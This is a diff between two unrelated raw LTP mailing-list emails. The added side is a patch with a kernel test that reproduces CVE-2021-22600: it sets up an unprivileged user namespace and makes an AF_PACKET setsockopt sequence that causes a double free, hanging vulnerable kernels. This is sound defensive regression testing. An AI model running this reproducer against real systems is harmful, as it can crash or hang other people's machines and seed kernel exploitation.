@@ -4,69 +4,62 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from picard.linux.it (picard.linux.it [213.254.12.146])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id D949BC433EF
-	for <ltp@archiver.kernel.org>; Thu, 17 Feb 2022 11:45:38 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 60EFAC433EF
+	for <ltp@archiver.kernel.org>; Thu, 17 Feb 2022 12:16:15 +0000 (UTC)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id 5A6F33CA0A7
-	for <ltp@archiver.kernel.org>; Thu, 17 Feb 2022 12:45:36 +0100 (CET)
-Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it [217.194.8.3])
+	by picard.linux.it (Postfix) with ESMTP id 492F53C9F3F
+	for <ltp@archiver.kernel.org>; Thu, 17 Feb 2022 13:16:12 +0100 (CET)
+Received: from in-6.smtp.seeweb.it (in-6.smtp.seeweb.it [217.194.8.6])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (2048 bits))
  (No client certificate requested)
- by picard.linux.it (Postfix) with ESMTPS id 9C5073C9564
- for <ltp@lists.linux.it>; Thu, 17 Feb 2022 12:45:26 +0100 (CET)
-Received: from smtp-out1.suse.de (smtp-out1.suse.de [195.135.220.28])
+ by picard.linux.it (Postfix) with ESMTPS id E27953C93A9
+ for <ltp@lists.linux.it>; Thu, 17 Feb 2022 13:16:02 +0100 (CET)
+Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.220.29])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
  (No client certificate requested)
- by in-3.smtp.seeweb.it (Postfix) with ESMTPS id DA2931A01955
- for <ltp@lists.linux.it>; Thu, 17 Feb 2022 12:45:25 +0100 (CET)
+ by in-6.smtp.seeweb.it (Postfix) with ESMTPS id 41108140163B
+ for <ltp@lists.linux.it>; Thu, 17 Feb 2022 13:16:01 +0100 (CET)
 Received: from imap2.suse-dmz.suse.de (imap2.suse-dmz.suse.de [192.168.254.74])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature ECDSA (P-521) server-digest SHA512)
  (No client certificate requested)
- by smtp-out1.suse.de (Postfix) with ESMTPS id 0283C210DC;
- Thu, 17 Feb 2022 11:45:25 +0000 (UTC)
+ by smtp-out2.suse.de (Postfix) with ESMTPS id 505AF1F383;
+ Thu, 17 Feb 2022 12:16:01 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
- t=1645098325;
- h=from:from:reply-to:reply-to:date:date:message-id:message-id:to:to:
- cc:cc:mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=loLYtvZYPROQc5ZQMZ4V5vjbczPWRMwCwDS0xewDOb0=;
- b=iKJ5wJ2+8i9Wv9xBSkMzLpQngwIymtW8BQeViqXqXuBdq7pZ7MoJ5F3aybMMi4Iqg+eWok
- Tn8VSQPhJ4+VClAhODJNoT72y3a49UOxtK8qxcjXT12rwpg27Z1LZFuJkya7n6LFble3b7
- jIH1t8jWMkwsg98xbOcj2w2G8brWUXo=
+ t=1645100161; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+ mime-version:mime-version: content-transfer-encoding:content-transfer-encoding;
+ bh=CoCRu4jHnDrQ6xq0vND1zJx5DGVHrN5R/igdb/I/w9A=;
+ b=EpHDoJscG/coGzTiHBlHyREXJ5NkMVmu5HMJRgY7+O6RbR6itWm2rjOkby+KVUbsNieCTE
+ qf+pgc3Syz7gSZWh9pxbigMG3W520wXbYvjasaAYNlgcCoWg0yT+8FRiMcW5r4BrtfkyT7
+ nT1SIvHiz7HvF6LGfrBAc/sYQKYs31s=
 DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
- s=susede2_ed25519; t=1645098325;
- h=from:from:reply-to:reply-to:date:date:message-id:message-id:to:to:
- cc:cc:mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=loLYtvZYPROQc5ZQMZ4V5vjbczPWRMwCwDS0xewDOb0=;
- b=fg2+dgVZN4SwakyIJeRQbEWYdlM4g4G801/0LWtKx1y6PVXkcl00InXWvGuzwYGj1IuPdh
- eLurrq59nAPMljCg==
+ s=susede2_ed25519; t=1645100161;
+ h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+ mime-version:mime-version: content-transfer-encoding:content-transfer-encoding;
+ bh=CoCRu4jHnDrQ6xq0vND1zJx5DGVHrN5R/igdb/I/w9A=;
+ b=Zwfzsx5Vpm2Q9NFA1TkpGhYs3c/BVwBLMEJE57UqL/OgkF8yVT4fyDXU0PnurTeeRn78Qt
+ /RcdXA+bvOnqhtDw==
 Received: from imap2.suse-dmz.suse.de (imap2.suse-dmz.suse.de [192.168.254.74])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature ECDSA (P-521) server-digest SHA512)
  (No client certificate requested)
- by imap2.suse-dmz.suse.de (Postfix) with ESMTPS id AA6AE13BBF;
- Thu, 17 Feb 2022 11:45:24 +0000 (UTC)
+ by imap2.suse-dmz.suse.de (Postfix) with ESMTPS id 3CFE513BE2;
+ Thu, 17 Feb 2022 12:16:01 +0000 (UTC)
 Received: from dovecot-director2.suse.de ([192.168.254.65])
- by imap2.suse-dmz.suse.de with ESMTPSA id HMTzJ1Q1DmJlZQAAMHmgww
- (envelope-from <pvorel@suse.cz>); Thu, 17 Feb 2022 11:45:24 +0000
-Date: Thu, 17 Feb 2022 12:45:22 +0100
-From: Petr Vorel <pvorel@suse.cz>
-To: Cyril Hrubis <chrubis@suse.cz>
-Message-ID: <Yg41Uk3IxfBRX+i8@pevik>
-References: <20220203170522.22051-1-pvorel@suse.cz>
- <20220203170522.22051-3-pvorel@suse.cz> <Yg4bt2V6rrircZ+x@yuki>
+ by imap2.suse-dmz.suse.de with ESMTPSA id 9YXvDYE8DmJhdQAAMHmgww
+ (envelope-from <mdoucha@suse.cz>); Thu, 17 Feb 2022 12:16:01 +0000
+From: Martin Doucha <mdoucha@suse.cz>
+To: Marcos Paulo de Souza <mpdesouza@suse.com>,
+	ltp@lists.linux.it
+Date: Thu, 17 Feb 2022 13:16:00 +0100
+Message-Id: <20220217121600.3002-1-mdoucha@suse.cz>
+X-Mailer: git-send-email 2.34.1
 MIME-Version: 1.0
-Content-Disposition: inline
-In-Reply-To: <Yg4bt2V6rrircZ+x@yuki>
-X-Virus-Scanned: clamav-milter 0.102.4 at in-3.smtp.seeweb.it
+X-Virus-Scanned: clamav-milter 0.102.4 at in-6.smtp.seeweb.it
 X-Virus-Status: Clean
-Subject: Re: [LTP] [PATCH 2/2] sctputil.h: TCONF on EAFNOSUPPORT
+Subject: [LTP] [PATCH] Add test for CVE 2021-22600
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -78,60 +71,166 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
-Reply-To: Petr Vorel <pvorel@suse.cz>
-Cc: Vlad Yasevich <vyasevich@gmail.com>,
- Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>,
- Neil Horman <nhorman@tuxdriver.com>, ltp@lists.linux.it,
- linux-sctp@vger.kernel.org
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
 Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
 
-SGkgQ3lyaWwsIGFsbCwKCj4gSGkhCj4gPiBkaWZmIC0tZ2l0IGEvdXRpbHMvc2N0cC90ZXN0bGli
-L3NjdHB1dGlsLmggYi91dGlscy9zY3RwL3Rlc3RsaWIvc2N0cHV0aWwuaAo+ID4gaW5kZXggMWUy
-MTc2MGJlYy4uYzRiZWRiNDdjZiAxMDA2NDQKPiA+IC0tLSBhL3V0aWxzL3NjdHAvdGVzdGxpYi9z
-Y3RwdXRpbC5oCj4gPiArKysgYi91dGlscy9zY3RwL3Rlc3RsaWIvc2N0cHV0aWwuaAo+ID4gQEAg
-LTEzMyw5ICsxMzMsMTQgQEAgZXh0ZXJuIGludCBUU1RfQ05UOwo+ID4gIHN0YXRpYyBpbmxpbmUg
-aW50IHRlc3Rfc29ja2V0KGludCBkb21haW4sIGludCB0eXBlLCBpbnQgcHJvdG9jb2wpCj4gPiAg
-ewo+ID4gIAlpbnQgc2sgPSBzb2NrZXQoZG9tYWluLCB0eXBlLCBwcm90b2NvbCk7Cj4gPiArCWlu
-dCByZXMgPSBUQlJPSzsKCj4gPiAtCWlmIChzayA9PSAtMSkKPiA+IC0JCXRzdF9icmttKFRCUk9L
-LCB0c3RfZXhpdCwgInNvY2tldDogJXMiLCBzdHJlcnJvcihlcnJubykpOwo+ID4gKwlpZiAoc2sg
-PT0gLTEpIHsKPiA+ICsJCWlmIChlcnJubyA9PSBFQUZOT1NVUFBPUlQpCj4gPiArCQkJcmVzID0g
-VENPTkY7Cj4gPiArCj4gPiArCQl0c3RfYnJrbShyZXMsIHRzdF9leGl0LCAic29ja2V0OiAlcyIs
-IHN0cmVycm9yKGVycm5vKSk7Cj4gPiArCX0KCj4gSSB3b3VsZCBrZWVwIHRoZSBtZXNzYWdlcyBz
-ZXBhcmF0ZWQgaGVyZSwgaS5lLiBkbyBzb21ldGhpbmcgYXM6Cgo+IAlpZiAoZXJybm8gPT0gRUFG
-Tk9TVVBQT1JUKQo+IAkJdHN0X2Jya20oVEJST0sgfCBURVJSTk8sICJzb2NrZXQoJWksICVpLCAl
-aSkgbm90IHN1cHBvcnRlZCIsCj4gCQkJIGRvbWFpbiwgdHlwZSwgcHJvdG9jb2wpOwoKPiAJdHN0
-X2Jya20oVEJST0sgfCBURVJSTk8sICJzb2NrZXQoKSIpOworMQoKCj4gQnR3IHRoaXMgY29kZSBh
-Y3R1YWxseSBkdXBsaWNhdGVzIHRoZSBzYWZlX3NvY2tldCgpIGZ1bmN0aW9uIHdlIGRvIGhhdmUK
-PiBhbHJlYWR5LCBzbyBpdCBtYXkgYXMgd2VsbCBiZSBlYXNpZXIgdG8ganVzdCByZXBsYWNlIHRo
-ZSB0ZXN0X3NvY2tldCgpCj4gd2l0aCBTQUZFX1NPQ0tFVCgpIGluIHRoZSB0ZXN0cy4uLgpJIG9y
-aWdpbmFsbHkgd2FudGVkIHRvIHVzZSBzYWZlX21hY3Jvcy5oIGluIHNjdHB1dGlsLmggdG8gcmVw
-bGFjZSB0aGVzZQp0ZXN0X3tiaW5kLGNvbm5lY3QsbGlzdGVuLHNvY2tldH0gd2l0aCB0aGVpciBT
-QUZFXyooKSB2YXJpYW50cy4KCkJ1dCBpdCBsZWFkcyBpbnRvIGRlcGVuZGVuY3kgbWFueSByZWRl
-ZmluaXRpb24gcHJvYmxlbXMgZHVlIG1peGluZwo8bmV0aW5ldC9pbi5oPiBhbmQgPGxpbnV4L2lu
-Lmg+LCBlLmcuOgoKL3Vzci9pbmNsdWRlL25ldGluZXQvaW4uaDo2ODo1OiBlcnJvcjogcmVkZWNs
-YXJhdGlvbiBvZiBlbnVtZXJhdG9yIOKAmElQUFJPVE9fR1JF4oCZCiAgIDY4IHwgICAgIElQUFJP
-VE9fR1JFID0gNDcsICAgICAgLyogR2VuZXJhbCBSb3V0aW5nIEVuY2Fwc3VsYXRpb24uICAqLwov
-dXNyL2luY2x1ZGUvbGludXgvaW4uaDo1NTozOiBub3RlOiBwcmV2aW91cyBkZWZpbml0aW9uIG9m
-IOKAmElQUFJPVE9fR1JF4oCZIHdpdGggdHlwZSDigJhlbnVtIDxhbm9ueW1vdXM+4oCZCiAgIDU1
-IHwgICBJUFBST1RPX0dSRSA9IDQ3LCAgICAgICAgICAgICAvKiBDaXNjbyBHUkUgdHVubmVscyAo
-cmZjIDE3MDEsMTcwMikgICAgKi8KICAgICAgfCAgIF5+fn5+fn5+fn5+CmluIHV0aWxzL3NjdHAv
-ZnVuY190ZXN0cy90ZXN0XzFfdG9fMV9ydG9pbmZvLmMsIHdoaWNoIHJlcXVpcmVzIDxsaW51eC9p
-bi5oPiBmb3IKYXQgbGVhc3QgSVBQUk9UT19TQ1RQIHdoaWNoIGlzIG5vdCBpbiA8bmV0aW5ldC9p
-bi5oPi4KCklQUFJPVE9fU0NUUCBpcyBhbHNvIGluIDxsaW51eC9zY3RwLmg+LCBidXQgaXQgYWxz
-byByZXF1aXJlcyA8bmV0aW5ldC9zY3RwLmg+CmZvciBzY3RwX3JlY3Ztc2coKSBhbmQgaXQgY3Jl
-YXRlcyBhbm90aGVyIHJlZGVmaW5pdGlvbiBjb25mbGljdCBkdWUgdXNpbmcKPG5ldGluZXQvc2N0
-cC5oPiB3aXRoIDxsaW51eC9zY3RwLmg+ID0+IGRlcGVuZGVuY3kgaGVsbCA6KS4KCkZZSSB0ZXN0
-XzFfdG9fMV9ydG9pbmZvLmMgdXNlcyB0ZXN0X3NvY2tldCgpIGFuZCBzY3RwdXRpbC5oLgoKU3Vy
-ZSB0aGlzIGlzIHNvbHZhYmxlIHZpYSBlaXRoZXIgdXNpbmcgbGFwaSBoZWFkZXJzIHdoaWNoIHdv
-dWxkIGxvYWQgb25seSBvbmUgb2YKdGhlbSBhbmQgd2l0aCBhZGRpbmcgZXh0cmEgZGVmaW5pdGlv
-bnMgb3Igc2ltcGxlIGp1c3QgYWRkaW5nIHRoZSBtaXNzaW5nCmRlZmluaXRpb25zIGludG8gc2N0
-cHV0aWwuaC4KCkJ1dCBJTUhPIGEgY2xlYW5lciBzb2x1dGlvbiBpcyB0byByZXdyaXRlIHRlc3Qg
-b25lIGJ5IG9uZSAod2hpY2ggd291bGQgdGFrZQp0aW1lKSwgYnV0IHdlJ3JlIHdhaXRpbmcgcmVw
-bHkgZnJvbSBTQ1RQIG1haW50YWluZXJzIHdoZXJlIChhbmQgd2hvKSBpcyBnb2luZyB0bwptYWlu
-dGFpbiB0aGVzZSB0ZXN0cyB3aGljaCBkZXNlcnZlIGEgbWFzc2l2ZSBjbGVhbnVwLi4uCgpUaHVz
-IGZvciBub3csIEknbGwgZm9sbG93IHlvdXIgb3RoZXIgc3VnZ2VzdGlvbnMgYW5kIG1lcmdlIHNv
-IHRoYXQgd2UgaGF2ZSBJUHY2CmZpeGVzIGluLgoKS2luZCByZWdhcmRzLApQZXRyCgotLSAKTWFp
-bGluZyBsaXN0IGluZm86IGh0dHBzOi8vbGlzdHMubGludXguaXQvbGlzdGluZm8vbHRwCg==
+Fixes #917
+
+Signed-off-by: Martin Doucha <mdoucha@suse.cz>
+---
+
+On a vulnerable system, the test will get stuck in the last setsockopt() call
+and become unkillable. Reproducer works reliably on affected SLE kernels.
+
+ runtest/syscalls                              |   1 +
+ .../kernel/syscalls/setsockopt/.gitignore     |   1 +
+ .../kernel/syscalls/setsockopt/setsockopt09.c | 111 ++++++++++++++++++
+ 3 files changed, 113 insertions(+)
+ create mode 100644 testcases/kernel/syscalls/setsockopt/setsockopt09.c
+
+diff --git a/runtest/syscalls b/runtest/syscalls
+index ce6f89f88..6c88454cc 100644
+--- a/runtest/syscalls
++++ b/runtest/syscalls
+@@ -1391,6 +1391,7 @@ setsockopt05 setsockopt05
+ setsockopt06 setsockopt06
+ setsockopt07 setsockopt07
+ setsockopt08 setsockopt08
++setsockopt09 setsockopt09
+ 
+ settimeofday01 settimeofday01
+ settimeofday02 settimeofday02
+diff --git a/testcases/kernel/syscalls/setsockopt/.gitignore b/testcases/kernel/syscalls/setsockopt/.gitignore
+index 95a5e43f8..fd3235bb3 100644
+--- a/testcases/kernel/syscalls/setsockopt/.gitignore
++++ b/testcases/kernel/syscalls/setsockopt/.gitignore
+@@ -6,3 +6,4 @@
+ /setsockopt06
+ /setsockopt07
+ /setsockopt08
++/setsockopt09
+diff --git a/testcases/kernel/syscalls/setsockopt/setsockopt09.c b/testcases/kernel/syscalls/setsockopt/setsockopt09.c
+new file mode 100644
+index 000000000..2b8dc5171
+--- /dev/null
++++ b/testcases/kernel/syscalls/setsockopt/setsockopt09.c
+@@ -0,0 +1,111 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++/*
++ * Copyright (c) 2022 SUSE LLC
++ * Author: Marcos Paulo de Souza <mpdesouza@suse.com>
++ * LTP port: Martin Doucha <mdoucha@suse.cz>
++ */
++
++/*
++ * CVE-2021-22600
++ *
++ * Check for possible double free of rx_owner_map after switching packet
++ * interface versions. Kernel crash fixed in:
++ *
++ *  commit ec6af094ea28f0f2dda1a6a33b14cd57e36a9755
++ *  Author: Willem de Bruijn <willemb@google.com>
++ *  Date:   Wed Dec 15 09:39:37 2021 -0500
++ *
++ *  net/packet: rx_owner_map depends on pg_vec
++ */
++
++#define _GNU_SOURCE
++#include <unistd.h>
++#include <sys/types.h>
++#include <sys/socket.h>
++#include <sched.h>
++
++#include "tst_test.h"
++#include "lapi/if_packet.h"
++
++static int sock = -1;
++
++static void setup(void)
++{
++	int real_uid = getuid();
++	int real_gid = getgid();
++
++	SAFE_TRY_FILE_PRINTF("/proc/sys/user/max_user_namespaces", "%d", 10);
++
++	SAFE_UNSHARE(CLONE_NEWUSER);
++	SAFE_UNSHARE(CLONE_NEWNET);
++	SAFE_FILE_PRINTF("/proc/self/setgroups", "deny");
++	SAFE_FILE_PRINTF("/proc/self/uid_map", "0 %d 1", real_uid);
++	SAFE_FILE_PRINTF("/proc/self/gid_map", "0 %d 1", real_gid);
++}
++
++static void run(void)
++{
++	unsigned int version = TPACKET_V3;
++	struct tpacket_req3 req = {
++		.tp_block_size = 16384,
++		.tp_block_nr = 256,
++		.tp_frame_size = TPACKET_ALIGNMENT << 7,
++		.tp_retire_blk_tov = 64,
++		.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH
++	};
++
++	req.tp_frame_nr = req.tp_block_size * req.tp_block_nr;
++	req.tp_frame_nr /= req.tp_frame_size;
++
++	sock = SAFE_SOCKET(AF_PACKET, SOCK_RAW, 0);
++	TEST(setsockopt(sock, SOL_PACKET, PACKET_VERSION, &version,
++		sizeof(version)));
++
++	if (TST_RET == -1 && TST_ERR == EINVAL)
++		tst_brk(TCONF | TTERRNO, "TPACKET_V3 not supported");
++
++	if (TST_RET) {
++		tst_brk(TBROK | TTERRNO,
++			"setsockopt(PACKET_VERSION, TPACKET_V3");
++	}
++
++	/* Allocate owner map and then free it again */
++	SAFE_SETSOCKOPT(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
++	req.tp_block_nr = 0;
++	req.tp_frame_nr = 0;
++	SAFE_SETSOCKOPT(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
++
++	/* Switch interface version and trigger double free of owner map */
++	SAFE_SETSOCKOPT_INT(sock, SOL_PACKET, PACKET_VERSION, TPACKET_V2);
++	SAFE_SETSOCKOPT(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
++
++	tst_res(TPASS, "Nothing bad happened, probably");
++}
++
++static void cleanup(void)
++{
++	if (sock >= 0)
++		SAFE_CLOSE(sock);
++}
++
++static struct tst_test test = {
++	.test_all = run,
++	.setup = setup,
++	.cleanup = cleanup,
++	.timeout = 5,
++	.taint_check = TST_TAINT_W | TST_TAINT_D,
++	.needs_kconfigs = (const char *[]) {
++		"CONFIG_USER_NS=y",
++		"CONFIG_NET_NS=y",
++		NULL
++	},
++	.save_restore = (const char * const[]) {
++		"?/proc/sys/user/max_user_namespaces",
++		NULL,
++	},
++	.tags = (const struct tst_tag[]) {
++		{"linux-git", "ec6af094ea28"},
++		{"CVE", "2021-22600"},
++		{}
++	}
++};
+-- 
+2.34.1
+
+
+-- 
+Mailing list info: https://lists.linux.it/listinfo/ltp
